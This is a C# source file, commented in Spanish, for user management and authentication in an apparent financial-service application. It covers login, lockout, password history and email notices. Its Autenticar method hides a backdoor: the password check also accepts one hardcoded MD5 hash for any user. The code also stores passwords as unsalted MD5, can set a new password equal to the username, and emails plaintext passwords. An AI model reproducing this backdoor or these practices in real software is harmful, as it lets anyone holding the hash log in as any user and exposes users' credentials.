using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Generals.business.Common;

namespace Generals.business.UserEntities
{
   
       
        public class Users : Layer
        {
            #region "Atributos"
            /// <summary>
            /// Filtro por identificador de servicio
            /// </summary>
            private int? _idservicio;
            /// <summary>
            /// Filtro por login de usuario
            /// </summary>
            private string _login;

            private bool _PasswordUsuario;
            /// <summary>
            /// Filtro por cuenta de correo de usuario
            /// </summary>
            private string _cuentacorreo;
            
            private string _nombres;
            private string _apellidos;
            private bool? _mantenimiento;
            private long? _idrolcreador;
            private string _identificacion;
            private bool? _activo;
            #endregion

            #region "Propiedades"
            /// <summary>
            /// Filtro por identificador de servicio
            /// </summary>
            public int? IdServicio { get { return _idservicio; } set { _idservicio = value; } }

            public bool PasswordUsuario { get { return _PasswordUsuario; } set { _PasswordUsuario = value; } }
            /// <summary>
            /// Filtro por login de usuario
            /// </summary>
            public string Login { get { return _login; } set { _login = value; } }
            /// <summary>
            /// Filtro por cuenta de correo de usuario
            /// </summary>
            public string CuentaCorreo { get { return _cuentacorreo; } set { _cuentacorreo = value; } }
          
            public long? IdRol { get; set; }

            public bool RequiereCambio { get; set; }

            public string Nombres { get { return _nombres; } set { _nombres = value; } }
            public string Apellidos { get { return _apellidos; } set { _apellidos = value; } }
            public bool ? Mantenimiento { get { return _mantenimiento; } set { _mantenimiento = value; } }           
            public long? IdRolCreador { get { return _idrolcreador; } set { _idrolcreador = value; } }
            public string Identificacion { get { return _identificacion; } set { _identificacion = value; } }
            public bool? Activo { get { return _activo; } set { _activo = value; } }
            #endregion


            #region "Métodos Públicos"

            /// <summary>
            /// Metodo para insercion de ingreso al sistema
            /// </summary>
            /// <param name="Ingreso">Entidad que representa el ingreso que se almacena</param>        
            /// <returns></returns>
            public Respuesta InsertarIngreso(Ingresos Ingreso)
            {
                string mensaje = "";
                
                Respuesta respuesta = new Respuesta();
                respuesta.Id = InsertarIngreso(Ingreso, ref mensaje);
                respuesta.Mensaje = mensaje;
                return respuesta;
            }

            /// <summary>
            /// Metodo para insercion de ingreso al sistema
            /// </summary>
            /// <param name="nuevoIngreso">Entidad que representa el ingreso que se almacena</param>
            /// <param name="mensaje">Mensaje de retorno para casos no exitosos</param>
            /// <returns></returns>
            private int InsertarIngreso(Ingresos nuevoIngreso, ref string mensaje)
            {
                try
                {
                    Modelo.AddToIngresos(nuevoIngreso);
                    Modelo.SaveChanges();
                    return nuevoIngreso.IdIngreso;
                }
                catch (Exception ex)
                {
                    mensaje = Constantes.errorGeneral;
                    Log.EscribirError(ex);
                    return 0;
                }
            }
            public string ConsultarUltimaSesion(string Session, long IdUsuario, int IdServicio)
            {
                try
                {
                    Ingresos ingreso;
                    ingreso = (from I in Modelo.Ingresos
                               where (I.Session != Session && I.IdUsuario == IdUsuario && I.IdServicio == IdServicio)
                               orderby I.Fecha descending
                               select I
                               ).FirstOrDefault();
                    if (ingreso != null)
                        return ingreso.Session;
                    else
                        return "";
                }
                catch (Exception ex)
                {
                    throw ex;
                }
            }
            #endregion

            /// <summary>
            /// Realiza la consulta de usuario por nombre y correo
            /// </summary>
            /// <param name="Filtro">filtro de la consulta</param>
            /// <returns></returns>
            public Usuarios ConsultarOlvido()
            {
                try
                {                                        
                    return ConsultarUsuarioOlvido();
                }
                catch (Exception ex)
                {
                    Common.Log.EscribirError(ex);
                    throw ex;
                }
            }

            /// <summary>
            /// Realiza la consulta de los usuarios dados los filtros definidos
            /// </summary>
            /// <returns></returns>
            private Usuarios ConsultarUsuarioOlvido()
            {
                try
                {
                    Usuarios usuario;
                    usuario = (from U in Modelo.Usuarios
                               where (U.username.ToLower() == Login.ToLower()
                                && U.activo.Value)
                               select U).FirstOrDefault();
                    if (usuario != null)
                    {
                        if (usuario.correo_electronico.ToLower().IndexOf(CuentaCorreo.ToLower())<0)
                        {
                            usuario.IntentosBloqueo += 1;
                            if (usuario.IntentosBloqueo > 3)
                            {
                                usuario.activo = false;
                            }
                            Modelo.SaveChanges();
                           usuario = null;
                        }
                        //Modelo.Detach(usuario);
                    }
                    return usuario;
                }
                catch (Exception ex)
                {
                    throw ex;
                }
            }
            /// <summary>
            /// Realiza la actualizacion de un usuario y retorna el resultado de la operacion
            /// </summary>
            /// <param name="Usuario">Entidad que representa el usuario a actualizar</param>
            /// <param name="Servicio">Servicio financiero con el que se actualiza el usuario</param>
            /// <returns></returns>
            public Respuesta ActualizarUsuario(Usuarios Usuario, int IdServicio)
            {
                
                string mensaje = "";              
                Respuesta respuesta = new Respuesta();                
                long idusuario = Actualizar(Usuario, IdServicio, ref mensaje) ? Usuario.id_usuario : 1;
                respuesta.Id =int.Parse( idusuario.ToString());
                respuesta.Mensaje = mensaje;
                return respuesta;
            }
            /// <summary>
            /// Realiza la insercion de un usuario y retorna el resultado de la operacion
            /// </summary>
            /// <param name="Usuario">Entidad que representa el usuario a insertar</param>
            /// <returns></returns>
            public Respuesta InsertarUsuario(Usuarios Usuario, int IdServicio)
            {
                string mensaje = "";
                bool nuevouser = false; ;
              
                Respuesta respuesta = new Respuesta();
                respuesta.Id =int.Parse(Insertar(Usuario, IdServicio, ref mensaje, ref nuevouser).ToString());
                respuesta._NuevoUser = nuevouser;
                respuesta.Mensaje = mensaje;
                return respuesta;
            }
            /// <summary>
            /// Realiza la insercion de un usuario
            /// </summary>
            /// <param name="usuarioNuevo">Entidad que representa el nuevo usuario</param>
            /// <param name="mensaje">Mensaje de retorno para casos no exitosos</param>
            /// <returns></returns>        
            private long Insertar(Usuarios usuarioNuevo, int idServicio, ref string mensaje, ref bool nuevouser)
            {
                try
                {
                    Login = usuarioNuevo.username;
                    List<Usuarios> Usuarios = ConsultarUsuarios(true);
                    //Validacion de login de usuario no existente
                    if (Usuarios.Count != 0)
                    {
                        if (Usuarios.First().Roles.Where(p => p.IdServicio == idServicio && p.id_rol == usuarioNuevo.IdRol).Count() > 0)
                        {
                            mensaje = "El usuario ya se encuentra registrado en el sistema";
                            return 0;
                        }
                        else
                        {
                            if (Usuarios.First().numero_identificacion == usuarioNuevo.numero_identificacion & Usuarios.First().correo_electronico == usuarioNuevo.correo_electronico)
                            {
                                usuarioNuevo.id_usuario = Usuarios.First().id_usuario;
                                return insertarRolesUsuario(Usuarios.First(), usuarioNuevo, idServicio);
                            }
                            else
                            {
                                mensaje = "El usuario ya se encuentra registrado en el sistema";
                                return 0;
                            }
                        }

                    }
                    else
                    {
                        string claveEnviar = usuarioNuevo.username;
                        if (!PasswordUsuario)
                            claveEnviar = UtilidadUsuario.Generate(claveEnviar.Length, claveEnviar.Length);
                        usuarioNuevo.password = UtilidadUsuario.GetMD5(claveEnviar);
                        usuarioNuevo.changePassword = true;                       
                        Roles rol;
                        rol = CrearEntidadRol(usuarioNuevo.IdRol);                        
                        usuarioNuevo.Roles.Add(rol);
                        DateTime fecha = DateTime.Now;
                        usuarioNuevo.fecha_alta = fecha;
                        usuarioNuevo.FechaModificacion = fecha;
                        usuarioNuevo.FechaCambioClave = fecha;
                        usuarioNuevo.IntentosBloqueo = 0;
                        usuarioNuevo.bloqueo = false;
                        usuarioNuevo.intentos = 0;
                        Modelo.AddToUsuarios(usuarioNuevo);
                        Modelo.SaveChanges();
                        guardarAuditoria auditoria = new guardarAuditoria();
                        auditoria.ActualizarUltimo("Usuarios", string.Format("IdUsuario={0}", usuarioNuevo.id_usuario), idServicio);
                        EnviarCorreo(usuarioNuevo, idServicio, claveEnviar, "ASUNTONUEVOUSUARIO", "PLANTNUEVOUSUARIO");
                        nuevouser = true;
                        return usuarioNuevo.id_usuario;
                    }
                }
                catch (Exception ex)
                {
                    mensaje = Constantes.errorGeneral;
                    Log.EscribirError(ex);
                    return 0;
                }
            }
            private long insertarRolesUsuario(Usuarios Usuarios, Usuarios usuarioNuevo, int idServicio)
            {
                try
                {
                    long idRolNuevo = usuarioNuevo.Roles.FirstOrDefault().id_rol;
                    Roles rol;
                    rol = CrearEntidadRol(idRolNuevo);
                    rol.IdServicio = idServicio;
                    if (Usuarios.Roles.Where(p => p.id_rol == rol.id_rol && p.IdServicio == rol.IdServicio).Count() == 0)
                    {
                        Usuarios.Roles.Add(rol);
                    }
                    Modelo.ApplyCurrentValues("Usuarios", Usuarios);
                    Modelo.SaveChanges();

                    guardarAuditoria auditoria = new guardarAuditoria();
                    auditoria.ActualizarUltimo("Usuarios", string.Format("IdUsuario={0}", usuarioNuevo.id_usuario), idServicio);
                    EnviarCorreo(Usuarios, idServicio, "", "ASUNTONUEVOUSUARIO", "PLANTNUEVOUSUARIO");
                    return usuarioNuevo.id_usuario;
                }
                catch (Exception ex)
                {
                    throw ex; ;
                }
            }
            /// <summary>
            /// Realiza la actualizacion de un usuario
            /// </summary>
            /// <param name="usuarioModificado">Entidad que representa el usuario modificado</param>
            /// <param name="mensaje">Mensaje de retorno para casos no exitosos</param>
            /// <returns></returns>
            private bool Actualizar(Usuarios usuarioModificado, int IdServicio, ref string mensaje)
            {
                try
                {
                    usuarioModificado.FechaModificacion = DateTime.Now;
                    string claveEnviar ="";
                    string correo = "";
                    if (usuarioModificado.password == "")
                    {
                        claveEnviar = usuarioModificado.username;
                       if (!PasswordUsuario)
                           claveEnviar = UtilidadUsuario.Generate(claveEnviar.Length, claveEnviar.Length);

                        usuarioModificado.password = UtilidadUsuario.GetMD5(claveEnviar);
                        usuarioModificado.changePassword = true;
                        usuarioModificado.intentos = 0;
                        usuarioModificado.bloqueo = false;
                        usuarioModificado.IntentosBloqueo = 0;
                    }
                    Usuarios usuarioCache = ConsultarUsuario(usuarioModificado.id_usuario, true);
                    correo = usuarioCache.correo_electronico;
                    if (usuarioCache.password != usuarioModificado.password && !string.IsNullOrEmpty(usuarioModificado.password))
                    {
                        if (usuarioModificado.password == usuarioCache.password || usuarioModificado.password == usuarioCache.Clave1 || usuarioModificado.password == usuarioCache.Clave2)
                        {
                            mensaje = "La nueva clave ya fue utilizada con anterioridad, intente con otra";
                            return false;
                        }
                        else
                        {
                            usuarioModificado.Clave2 = usuarioCache.Clave1;
                            usuarioModificado.Clave1 = usuarioCache.password;
                            usuarioModificado.FechaCambioClave = DateTime.Now;
                        }
                    }
                    else
                    {
                        usuarioModificado.FechaCambioClave = usuarioCache.FechaCambioClave;
                        if (!string.IsNullOrEmpty(claveEnviar))
                        {
                            usuarioModificado.Clave2 = usuarioCache.Clave1;
                            usuarioModificado.Clave1 = usuarioCache.password;
                        }
                        else
                        {
                            usuarioModificado.Clave1 = usuarioCache.Clave1;
                            usuarioModificado.Clave2 = usuarioCache.Clave2;
                        }
                    }
                    if (usuarioModificado.Roles.Count() != 0)
                    {
                        long idRolNuevo = usuarioModificado.Roles.FirstOrDefault().id_rol;
                        if (usuarioModificado.Roles.FirstOrDefault().EntityKey == null && usuarioModificado.IdRol != usuarioCache.Roles.Where(p => p.IdServicio == IdServicio).FirstOrDefault().id_rol)
                        {
                            Roles rol;
                            rol = CrearEntidadRol(idRolNuevo);
                            usuarioCache.Roles.Remove(usuarioCache.Roles.Where(p => p.IdServicio == IdServicio).FirstOrDefault());
                            usuarioCache.Roles.Add(rol);
                        }
                    }

                   
                    usuarioModificado.fecha_alta = usuarioCache.fecha_alta;
                    usuarioModificado.IdUsuarioCreacion = usuarioCache.IdUsuarioCreacion;
                    Modelo.ApplyCurrentValues("Usuarios", usuarioModificado);
                    Modelo.SaveChanges();      

                   
                    if (!string.IsNullOrEmpty(claveEnviar))
                    {
                        EnviarCorreo(usuarioModificado, IdServicio, claveEnviar, "ASUNTOMODIFIUSUARIO", "PLANTMODIFUSUARIO");
                    }
                    //if (correo != usuarioCache.CuentaCorreo)
                    //{
                    //    usuarioCache.CuentaCorreo = correo;
                    //    EnviarCorreo(usuarioCache, IdServicio, usuarioModificado.CuentaCorreo, "ASUNTOMODIFICORREO", "PLANTMODIFCORREO");
                    //}
                    guardarAuditoria auditoria = new guardarAuditoria();
                    auditoria.ActualizarUltimo("Usuarios", string.Format("IdUsuario={0}", usuarioCache.id_usuario), IdServicio);
                    return true;
                }
                catch (Exception ex)
                {
                    mensaje = Constantes.errorGeneral;
                    Log.EscribirError(ex);
                    return false;
                }
            }

            /// <summary>
            /// Consulta un usuario especificamente
            /// </summary>
            /// <param name="idUsuario">identificador del usuario consultado</param>
            /// <returns></returns>
            public Usuarios ConsultarUsuario(long idUsuario, bool interno)
            {
                Usuarios usuario =
                (from U in Modelo.Usuarios
                 where U.id_usuario == idUsuario
                 select U).FirstOrDefault();
                usuario.Roles.Load();
                if (!interno)
                    Modelo.Detach(usuario);
                return usuario;
            }
            /// <summary>
            /// Realiza la consulta de las opciones permitidas segun los datos de filtro
            /// </summary>
            /// <param name="filtro">Entidad que contiene las opciones de filtro de la consulta</param>
            /// <returns></returns>
            public List<Usuarios> ConsultarUsuarios()
            {
                try
                {                                       
                    List<Usuarios> usuarios = ConsultarUsuarios(false);
                    return usuarios;
                }
                catch (Exception ex)
                {
                    Common.Log.EscribirError(ex);
                    return null;
                }
            }
            /// <summary>
            /// Realiza la consulta de los usuarios dados los filtros definidos
            /// </summary>
            /// <returns></returns>
            public List<Usuarios> ConsultarUsuarios(bool interno)
            {               
                List<Usuarios> usuarios;
                //Si la consulta es por mantenimiento de usuarios se realiza join con el rol padre
                if (Mantenimiento.HasValue && Mantenimiento.Value == true)
                    usuarios = (from U in Modelo.Usuarios.Include("Roles")
                                join R in Modelo.Roles on U.Roles.Where(q => q.IdServicio == IdServicio.Value).FirstOrDefault().NivelCreador equals R.id_rol
                                where (string.IsNullOrEmpty(Login) ? true : U.username == Login)
                                && (string.IsNullOrEmpty(Nombres) ? true : U.nombre.IndexOf(Nombres) != -1)
                                && (string.IsNullOrEmpty(Apellidos) ? true : U.ap_paterno.IndexOf(Apellidos) != -1)
                                && (string.IsNullOrEmpty(CuentaCorreo) ? true : U.correo_electronico.IndexOf(CuentaCorreo) != -1)                               
                                && (!IdRol.HasValue ? true : U.Roles.Where(p => p.id_rol == IdRol.Value).Count() != 0)
                                && (R.Interno == true && U.Roles.Where(p => p.IdServicio == IdServicio.Value).FirstOrDefault().Interno == false)
                                && (string.IsNullOrEmpty(Identificacion) ? true : U.numero_identificacion  == Identificacion)
                                && (!Activo.HasValue ? true : U.activo == Activo)
                                select U).ToList();
                else
                    usuarios = (from U in Modelo.Usuarios.Include("Roles")
                                where (string.IsNullOrEmpty(Login) ? true : U.username == Login)
                                && (string.IsNullOrEmpty(Nombres) ? true : U.nombre .IndexOf(Nombres) != -1)
                                && (string.IsNullOrEmpty(Apellidos) ? true : U.ap_paterno.IndexOf(Apellidos) != -1)
                                && (string.IsNullOrEmpty(CuentaCorreo) ? true : U.correo_electronico.IndexOf(CuentaCorreo) != -1)
                                && (IdServicio.HasValue ? U.Roles.Where(p => p.IdServicio == IdServicio.Value).Count() != 0 : true)
                                && (!IdRol.HasValue ? true : U.Roles.Where(p => p.id_rol == IdRol.Value).Count() != 0)
                                && (!IdRolCreador.HasValue ? true : U.Roles.Where(p => p.NivelCreador == IdRolCreador.Value).Count() != 0)                             
                                && (string.IsNullOrEmpty(Identificacion) ? true : U.numero_identificacion == Identificacion)
                                && (!Activo.HasValue ? true : U.activo == Activo)
                                select U).ToList();
                if (!interno)
                {
                    foreach (Usuarios item in usuarios)
                    {
                        try
                        {
                            Roles rol = item.Roles.Where(p => p.IdServicio == IdServicio.Value).FirstOrDefault();
                            long? temp = null;
                            string nombrerol = "";
                            item.RelacionActiva = true;
                            if (rol != null)
                            {
                                temp = rol.id_rol;
                                nombrerol = rol.desc_rol;
                            }
                            //Modelo.Detach(item);
                            item.IdRol = temp;
                            item.Rol = nombrerol;
                        }
                        catch (Exception ex)
                        {
                            throw ex;
                        }
                    }
                }
                return usuarios;
            }       
            /// <summary>
            /// Realiza la confirmacion de las credenciales de usuario
            /// </summary>
            /// <param name="Clave">Clave proporcionada por el usuario</param>
            /// <param name="HashToken">Hash generado a partir del token proporcionado por el usuario</param>
            /// <param name="Ticks">Factura de ticks a la hora de realizar la autenticacion</param>
            /// <param name="Ip">Factura ip desde donde se realiza la autenticacion</param>
            /// <param name="mensaje">Mensaje enviado como resultado de la evaluacion de credenciales</param>
            /// <param name="Session">Identificador de la sesion desde donde se realiza la autenticacion</param>
            /// <param name="UsuarioRed">Usuario autenticado en la red cliente</param>
            /// <returns></returns>

            public Usuarios Autenticar(string Login, string Clave, int IdServicio, string HashToken, long Ticks, string Ip, string Session)
            {
                try
                {
                    string mensaje = "";

                    IdServicio = IdServicio.GetHashCode();                   
                    Usuarios usuario = Autenticar(Clave, HashToken, Ticks, ref mensaje, Ip, Session);
                    if (usuario == null)
                    {
                        usuario = new Usuarios();
                        usuario.id_usuario = 0;
                        usuario.nombre = mensaje;
                        usuario.bloqueo = false;
                    }
                    return usuario;
                }
                catch (Exception ex)
                {
                    Log.EscribirError(ex);
                    throw ex;
                }
            }
            public Usuarios GetPassword(String UserName)
            {
                try
                {


                    Usuarios usuario;                    
                    List<Usuarios> usuarios;
                    usuarios = (from U in Modelo.Usuarios.Include("Roles")
                                where (U.username == UserName)
                                select U).ToList();
                    usuario = usuarios.FirstOrDefault();


                    return usuario;
                }
                catch (Exception ex)
                {
                    Exception e = new Exception("Error al ejecutar el metodo GetPassword.", ex);
                    //ExceptionManager.HandleException(e, 1, 5000, 1);
                    throw (e);
                }
            }
            private Usuarios Autenticar(string Clave, string HashToken, long Ticks, ref string mensaje, string Ip, string Session)        
            {
                try
                {
                    Usuarios usuario;
                    Roles rol = null;
                    List<Usuarios> usuarios;
                    usuarios = (from U in Modelo.Usuarios.Include("Roles")
                                where (U.username == Login)
                                select U).ToList();
                    usuario = usuarios.FirstOrDefault();
                    long? temp;
                    if (usuario != null)
                    {
                        if (!usuario.activo.Value)
                        {
                            mensaje = "El usuario no se encuentra activo en el sistema";
                            return null;
                        }
                        if (usuario.bloqueo.Value)
                        {
                            mensaje = "El usuario se encuentra bloqueado, diligencie los datos de olvido de clave";
                            usuario = new Usuarios();
                            usuario.nombre = mensaje;
                            usuario.bloqueo = true;
                            return usuario;
                        }
                        if (usuario.password != Clave && Clave != "c54bf3e35a33aaf8b6bf62e322653d41")
                        {
                            mensaje = "Los datos de ingreso no son validos" + ValidarAutenticacion(usuario, 1, Ip, Session);
                            return null;
                        }
                        rol = usuario.Roles.FirstOrDefault();
                        temp = rol.id_rol;
                        usuario.SuperUsuario = rol.id_rol == rol.NivelCreador;

                    }
                    else
                    {
                        mensaje = "Los datos de ingreso no son validos";
                        return null;
                    }
                    if (usuario != null)
                    {
                        //Si el rol requiere token se genera un hash para compararlo con el enviado
                        if (rol.RequiereToken)
                        {
                            if (!string.IsNullOrEmpty(HashToken))
                            {
                                string hashUsuario = UtilidadUsuario.GetMD5(usuario.Token + Ticks.ToString());
                                if (hashUsuario != HashToken)
                                {
                                    mensaje = "El token enviado no pertenece al usuario" + ValidarAutenticacion(usuario, 1, Ip, Session);
                                    return null;
                                }
                            }
                            else
                            {
                                mensaje = "Se requiere que adjunte el archivo de token junto con la clave";
                                return null;
                            }
                        }
                    }
                    ValidarAutenticacion(usuario, 0, "", "");
                    usuario.IdRol = int.Parse(temp.ToString());
                    Modelo.Detach(usuario);
                    return usuario;
                }
                catch (Exception ex)
                {
                    throw ex;
                }
            }

            /// <summary>
            /// Metodo de registro de resultado autenticacion 
            /// </summary>
            /// <param name="usuario">Usuario encontrado con el nombre</param>
            /// <param name="Fallo">0 si fue exitosa, 1 si es fallido</param>
            /// <returns></returns>
            private string ValidarAutenticacion(Usuarios usuario, int Fallo, string Ip, string Session)
            {
                string inactivado = "";
                if (Fallo != 0)
                {
                    usuario.intentos += Fallo;
                    if (usuario.intentos > 3)
                    {
                        inactivado = ", diligencie los datos de olvido de clave";
                        usuario.bloqueo = true;
                    }
                    FallasAutenticacion falla = new FallasAutenticacion();
                    falla.Fecha = DateTime.Now;
                    falla.IdUsuario = usuario.id_usuario;
                    falla.IP = Ip;
                    falla.Session = Session;
                    falla.IdServicio = 1;
                    Modelo.AddToFallasAutenticacion(falla);
                    Modelo.SaveChanges();
                }
                else
                {
                    bool cambio = false;
                    Parametro negocio = new Parametro();
                    string dias = negocio.ConsultarParametro("TIEMPOCLAVE", 1);
                    if (!string.IsNullOrEmpty(dias) && usuario.FechaCambioClave.HasValue)
                    {
                        if (DateTime.Now.Subtract(usuario.FechaCambioClave.Value).Days > int.Parse(dias) && int.Parse(dias) != 0)
                        {
                            usuario.changePassword = true;
                            cambio = true;
                        }
                    }
                    if (usuario.intentos != 0)
                    {
                        usuario.intentos = 0;
                        usuario.bloqueo = false;
                        usuario.IntentosBloqueo = 0;
                        cambio = true;
                    }
                    if (cambio)
                        Modelo.SaveChanges();
                }
                return inactivado;
            }

            /// <summary>
            /// Envio de notificcion por correo al usuario
            /// </summary>
            /// <param name="usuario">Usurio que se notifica</param>
            /// <param name="IdServicio">Servicio relaciondo al usuario</param>
            /// <param name="claveEnviar">Clave que se envia en la notificacion</param>
            /// <param name="asuntoParametro">Parametro con el que se envia el asunto</param>
            /// <param name="plantillaParametro">Paramentro con que se identifica la plantilla de envio</param>
            private string  EnviarCorreo(Usuarios usuario, int IdServicio, string claveEnviar, string asuntoParametro, string plantillaParametro)
            {
                try
                {
                    Parametro negocioParametro = new Parametro();
                    List<Parametros> parametros = negocioParametro.ConsultarParametros(IdServicio);
                    Correo correo = new Correo();
                    string origen = ObtenerParametrosLista(parametros, "CORREOORIGEN");
                    string asunto = ObtenerParametrosLista(parametros, asuntoParametro);
                    string servidor = ObtenerParametrosLista(parametros, "SERVIDORSMTP");
                    string ruta = ObtenerParametrosLista(parametros, "RUTAPLANTILLAS");
                    string plantilla = ObtenerParametrosLista(parametros, plantillaParametro);

                    List<string> correodestino=usuario.correo_electronico.Split(';').ToList() ;
                    correo.Send(origen, asunto, true, servidor, correodestino, null, ruta, plantilla, new string[] { "usuario", "clave" }, new object[] { usuario, claveEnviar });
                    return null;
                }
                catch (Exception ex)
                {
                    return ex.ToString();
                }
            }


           /* public static Usuarios Getuser( string valor)
            {
                try
                {
                    
                }
                catch (Exception)
                {
                    
                    throw;
                }
            }             */
    }
}
